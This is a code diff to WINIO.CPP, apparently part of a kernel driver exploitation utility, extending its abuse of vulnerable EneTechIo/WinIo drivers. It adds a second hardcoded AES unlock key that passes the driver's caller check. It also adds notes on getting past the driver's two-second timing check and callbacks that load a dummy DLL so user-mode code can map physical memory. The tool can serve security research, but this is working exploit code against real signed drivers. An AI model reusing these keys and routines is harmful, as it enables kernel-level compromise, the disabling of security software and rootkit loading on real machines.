@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2020
+*  (C) COPYRIGHT AUTHORS, 2020 - 2021
 *
 *  TITLE:       WINIO.CPP
 *
-*  VERSION:     1.01
+*  VERSION:     1.10
 *
-*  DATE:        14 Feb 2020
+*  DATE:        02 Apr 2021
 *
 *  WINIO based drivers routines.
 *
@@ -27,9 +27,10 @@ extern "C" {
 #endif
 
 //
-// AES key used by EneTechIo latest variants.
+// AES keys used by EneTechIo latest variants.
 //
 ULONG g_EneTechIoUnlockKey[4] = { 0x54454E45, 0x4E484345, 0x474F4C4F, 0x434E4959 };
+ULONG g_EneTechIoUnlockKey2[4] = { 0x9984FD3E, 0x70683A8, 0xBD444418, 0x5E10D83 };
 
 //
 // Generic WINIO interface for all supported drivers based on WINIO code.
@@ -53,7 +54,7 @@ typedef VOID(WINAPI* pfnWinIoGenericUnmapMemory)(
     _In_ HANDLE SectionHandle,
     _In_ PVOID ReferencedObject);
 
-
+PUCHAR g_pvAESKey;
 pfnWinIoGenericMapMemory g_WinIoMapMemoryRoutine;
 pfnWinIoGenericUnmapMemory g_WinIoUnmapMemoryRoutine;
 BOOL g_PhysAddress64bit = FALSE;
@@ -218,11 +219,20 @@ PVOID WinIoMapMemory2(
     *ReferencedObject = NULL;
 
     RtlSecureZeroMemory(&ctx, sizeof(ctx));
-    AES_init_ctx(&ctx, (uint8_t*)&g_EneTechIoUnlockKey);
+    AES_init_ctx(&ctx, (uint8_t*)g_pvAESKey);
 
     RtlSecureZeroMemory(&request, sizeof(request));
     request.CommitSize = NumberOfBytes;
     request.BusAddress = PhysicalAddress;
+
+    //
+    // Debug warning.
+    //
+    // EneTechIo (A) and EneTechIo (B) implement requestor check based on 
+    // timing between key generation and time of check on driver side.
+    // It is limited to 2 seconds, thus you should not put any breakpoints 
+    // after key is generated and can only do that uppon EneTechIo device call completion.
+    //
 
     ULONG seconds = supGetTimeAsSecondsSince1970();
 
@@ -264,12 +274,21 @@ VOID WinIoUnmapMemory2(
     WINIO_PHYSICAL_MEMORY_INFO_EX request;
 
     RtlSecureZeroMemory(&ctx, sizeof(ctx));
-    AES_init_ctx(&ctx, (uint8_t*)&g_EneTechIoUnlockKey);
+    AES_init_ctx(&ctx, (uint8_t*)g_pvAESKey);
 
     RtlSecureZeroMemory(&request, sizeof(request));
     request.BaseAddress = SectionToUnmap;
     request.ReferencedObject = ReferencedObject;
     request.SectionHandle = SectionHandle;
+
+    //
+    // Debug warning.
+    //
+    // EneTechIo (A) and EneTechIo (B) implement requestor check based on 
+    // timing between key generation and time of check on driver side.
+    // It is limited to 2 seconds, thus you should not put any breakpoints 
+    // after key is generated and can only do that uppon EneTechIo device call completion.
+    //
 
     ULONG seconds = supGetTimeAsSecondsSince1970();
 
@@ -327,8 +346,6 @@ BOOL WINAPI WinIoQueryPML4Value(
             (PVOID)pbLowStub1M,
             sectionHandle,
             refObject);
-
-        dwError = ERROR_SUCCESS;
 
     } while (FALSE);
 
@@ -610,6 +627,22 @@ BOOL GlckIo2Register(
 }
 
 /*
+* WinIoPreOpen
+*
+* Purpose:
+*
+* Pre-open callback for some variants of Ene WinIo drivers.
+*
+*/
+BOOL WINAPI WinIoPreOpen(
+    _In_ PVOID Param
+)
+{
+    UNREFERENCED_PARAMETER(Param);
+    return supLoadDummyDll(FALSE);
+}
+
+/*
 * WinIoRegisterDriver
 *
 * Purpose:
@@ -643,6 +676,14 @@ BOOL WINAPI WinIoRegisterDriver(
     case IDR_ENETECHIO64:
         g_WinIoMapMemoryRoutine = WinIoMapMemory2;
         g_WinIoUnmapMemoryRoutine = WinIoUnmapMemory2;
+        g_pvAESKey = (PUCHAR)g_EneTechIoUnlockKey;
+        g_PhysAddress64bit = TRUE;
+        break;
+
+    case IDR_ENETECHIO64B:
+        g_WinIoMapMemoryRoutine = WinIoMapMemory2;
+        g_WinIoUnmapMemoryRoutine = WinIoUnmapMemory2;
+        g_pvAESKey = (PUCHAR)g_EneTechIoUnlockKey2;
         g_PhysAddress64bit = TRUE;
         break;
 
@@ -654,4 +695,39 @@ BOOL WINAPI WinIoRegisterDriver(
     }
 
     return TRUE;
+}
+
+/*
+* WinIoUnregisterDriver
+*
+* Purpose:
+*
+* Unregister routine for some variants of WinIo driver.
+*
+*/
+BOOL WINAPI WinIoUnregisterDriver(
+    _In_ HANDLE DeviceHandle,
+    _In_opt_ PVOID Param)
+{
+    HMODULE hDummyDll;
+    KDU_CONTEXT* Context = (KDU_CONTEXT*)Param;
+
+    UNREFERENCED_PARAMETER(DeviceHandle);
+
+    if (Context) {
+
+        if (Context->Provider->ResourceId == IDR_ENETECHIO64B) {
+
+            hDummyDll = GetModuleHandle(DUMMYDLL);
+
+            if (hDummyDll) {
+
+                if (FreeLibrary(hDummyDll)) {
+                    return supLoadDummyDll(TRUE);
+                }
+            }
+        }
+    }
+
+    return FALSE;
 }
